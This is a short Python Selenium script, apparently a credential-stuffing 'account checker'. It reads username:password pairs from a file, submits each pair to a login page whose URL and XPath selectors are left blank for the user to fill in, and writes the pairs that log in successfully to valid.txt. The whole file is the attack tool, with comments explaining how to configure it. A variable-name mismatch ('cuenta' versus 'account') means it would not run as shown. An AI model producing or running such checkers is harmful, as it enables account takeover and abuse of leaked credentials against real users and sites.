from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

with open("accounts.txt", "r", encoding="utf-8") as f:
    accounts = [line.strip() for line in f if ":" in line]

for account in accounts:
    username, password = cuenta.split(":")

    url = ""

    driver = webdriver.Chrome()
    driver.get(url)
    
    usernameInput = driver.find_element(By.XPATH, 'CHANGETHIS') # Copy the FULL XPATH of the username input and paste it
    usernameInput.send_keys(username)
    
    passwordInput = driver.find_element(By.XPATH, 'CHANGETHIS') # Copy the FULL XPATH of the password input and paste it
    passwordInput.send_keys(password)
    
    button = driver.find_element(By.XPATH, 'CHANGETHIS') # Copy the FULL XPATH of the login button and paste it
    button.click()
    
    try:
        WebDriverWait(driver, 2).until(
            EC.presence_of_element_located((By.XPATH, 'CHANGETHIS')) # Copy the FULL XPATH of the error that pops when your login is invalid and paste it
        )
        print(f"[INVALID] {username}")
    except:
        print(f"[VALID] {username}")
        with open("valid.txt", "a") as valids:
            valids.write(f"{username}:{password}\n")
    
    driver.quit()
